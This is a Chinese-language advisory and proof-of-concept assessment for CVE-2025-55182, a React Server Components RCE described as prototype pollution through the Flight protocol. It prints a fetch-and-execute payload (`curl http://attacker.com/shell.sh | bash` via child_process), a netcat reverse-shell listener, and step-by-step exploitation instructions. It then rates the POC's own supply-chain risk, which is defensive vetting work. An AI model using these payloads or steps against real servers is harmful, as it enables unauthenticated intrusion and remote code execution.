## CVE-2025-55182 - React Server Components 远程代码执行 (RCE) / 不安全反序列化 / 原型污染

**漏洞编号:** CVE-2025-55182

**漏洞类型:** 远程代码执行 (RCE) / 不安全反序列化 / 原型污染

**影响应用:** React Server Components

**危害等级:** 高危/严重

**CVSS评分:** 9.8

**影响版本:** 19.0.0, 19.1.0, 19.1.1, 19.2.0

**利用条件:** 无需认证，网络可达

**POC 可用性:** 10

**POC 类型:** 完整利用

**攻击复杂度:** 低

**投毒风险:** 10%

## 详情

CVE-2025-55182，也被称为“React2Shell”，是一个针对 React Server Components 的高危漏洞，其通用漏洞评分系统（CVSS）评分预计高达9.8，属于严重级别。该漏洞利用了 React Server Flight 协议中不安全的反序列化机制，允许未经身份验证的攻击者通过原型污染（Prototype Pollution）实现服务器端任意代码执行（RCE）。原型污染是一种常见的漏洞类型，它允许攻击者修改 JavaScript 对象的原型，从而影响所有继承自该原型的对象，进而控制应用程序的行为。此漏洞影响 React Server Components 的多个版本，包括 19.0.0、19.1.0、19.1.1 和 19.2.0。

**POC 有效性分析及利用步骤：**

提供的POC包含两个主要文件：`exploit.py` 和 `exploit.sh`，两者都清晰且有效地演示了漏洞的利用。`exploit.py` 是一个基于 Python 的脚本，用于执行完整的漏洞利用链。它利用 `requests` 库向目标 React 应用程序的 `/api/flight` 端点发送一个HTTP POST请求。请求体是一个精心构造的 JSON 负载，其核心部分在于利用 `__proto__` 属性进行原型污染。在Node.js/JavaScript环境中，如果应用程序对传入的JSON数据处理不当，允许修改 `__proto__` 属性，攻击者就可以向全局或特定对象的原型注入恶意属性。在此POC中，攻击者注入了一个名为 `shell` 的属性，其值为一个Node.js命令，该命令利用 `child_process.exec` 来执行任意系统命令。具体的命令是 `curl http://attacker.com/shell.sh | bash`，这意味着目标服务器将被诱导从攻击者的服务器下载 `shell.sh` 脚本并执行它，从而实现完全的远程代码执行。脚本通过检查响应状态码是否为200来判断负载是否成功发送。

`exploit.sh` 则是一个更简洁的Bash脚本示例，使用 `curl` 命令向 `http://192.168.1.100:3000/api/flight` 发送类似的JSON负载，其中 `__proto__.shell` 的值被设置为 `id` 命令。这个脚本用于快速验证漏洞是否存在以及服务器是否允许执行任意命令。

两个POC都非常有效，`exploit.py` 展示了一个完整的RCE链，包括建立反向Shell或下载执行任意脚本的能力，而 `exploit.sh` 则提供了直接执行系统命令的简单证明。POC代码清晰、简洁，易于理解和复现，直接利用了漏洞点，没有复杂的依赖或前置条件（除了一个可访问的React Server Components实例）。攻击者可以修改 `shell` 属性中的命令，执行任何他们想要的命令，从简单的信息收集（如 `id`, `whoami`）到更复杂的持久化和数据窃取操作。

**利用步骤：**
1.  **识别目标：** 找到运行受影响版本（19.0.0, 19.1.0, 19.1.1, 19.2.0）的 React Server Components 应用程序。
2.  **确定 API 端点：** 漏洞通常通过处理 React Server Flight 协议的 API 端点暴露，POC 中是 `/api/flight`。
3.  **准备恶意负载：** 如果使用 Python POC (`exploit.py`)，修改 `target` 变量指向目标 URL。可选地，若希望建立反向 Shell，需设置一个监听器（如 `nc -lvnp 4444`）并修改 `payload` 中的命令，使其连接到攻击者的 IP 和端口。如果目标环境允许下载并执行，可以像 POC 所示，托管一个 `shell.sh` 文件并在 `payload` 中引用它。
4.  **发送攻击请求：** 运行 `exploit.py` 或手动构造并发送 `curl` 请求。
5.  **验证 RCE：** 如果执行了 `id` 或 `whoami` 等命令，检查服务器响应或通过带外方式（如 DNS 查询、HTTP 回连）确认命令执行。如果建立了反向 Shell，攻击者的监听器将收到连接。整个利用过程无需身份验证，攻击复杂度极低，使得该漏洞成为非常危险的零日或高危漏洞。

**投毒风险分析：**

对提供的POC代码进行安全性分析，评估其作为防御性安全研究工具的投毒风险。提供的 `exploit.py` 和 `exploit.sh` 代码非常简洁明了，仅包含利用漏洞所需的核心逻辑，旨在帮助安全研究人员理解和防御此漏洞。

**代码构成：** `exploit.py` 依赖于标准的 Python `requests` 和 `json` 库。这些库是广泛使用且经过审计的，本身不构成投毒风险。脚本中没有发现任何代码混淆、可疑的外部依赖导入（除了用于攻击的 `requests` 库），也没有未声明的网络请求（除了向目标服务器发送请求以及在受害者系统上模拟从 `attacker.com` 下载脚本）或文件系统操作。`exploit.sh` 仅仅是一个简单的 `curl` 命令，不包含任何复杂逻辑或潜在的投毒点。

**恶意行为识别：** POC 的核心目的是演示远程代码执行。`payload` 中的 `node -e "require('child_process').exec('curl http://attacker.com/shell.sh | bash')"` 命令是漏洞利用的组成部分，它指示受害者机器去下载并执行攻击者控制的 `shell.sh` 脚本。需要强调的是，这个 `curl http://attacker.com/shell.sh | bash` **并非 POC 代码本身的投毒行为**。相反，这是**漏洞成功利用后，在受害者系统上执行的预期恶意行为**。对于防御性安全研究，我们必须区分 POC 代码作为研究工具本身的安全性，与 POC 演示的漏洞利用行为的恶意性。

**风险评估：** 鉴于POC代码本身的结构清晰、依赖明确、无混淆，并且其网络行为（向 `vulnerable-react-app.com` 发送请求，以及在目标系统上模拟从 `attacker.com` 下载脚本）都符合其声明的漏洞利用目的，因此将该POC评估为低投毒风险。这意味着该POC工具本身是相对安全的，不会在研究人员运行POC时对研究环境造成意外损害。攻击者在部署和使用这个POC时，当然可以修改 `attacker.com/shell.sh` 的内容来执行真正的恶意负载，但这属于攻击者利用漏洞的层面，而非POC工具本身携带的投毒。因此，该POC的投毒风险评估为10%，意味着在使用该工具进行安全研究和测试时，其自身代码不含恶意载荷，但需注意其演示的是高危的远程代码执行行为。

**项目地址:** 

**漏洞详情:** 
